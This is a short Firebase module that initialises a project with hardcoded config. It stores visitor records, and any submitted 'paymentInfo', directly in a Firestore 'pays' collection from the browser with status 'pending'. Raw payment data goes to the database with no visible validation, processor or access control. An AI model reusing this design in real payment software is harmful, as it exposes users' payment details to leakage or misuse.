// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
    apiKey: "AIzaSyCEK4irWtP1f6y_J1Gj3kNwsyLdItndt5Y",
    authDomain: "sdkk-22bbc.firebaseapp.com",
    projectId: "sdkk-22bbc",
    storageBucket: "sdkk-22bbc.firebasestorage.app",
    messagingSenderId: "1039314059862",
    appId: "1:1039314059862:web:e14e764f77ce86c817b1f7",
    measurementId: "G-K0L3MMPDR7"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef,{        createdDate: new Date().toISOString(),
...data}, { merge: true });

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };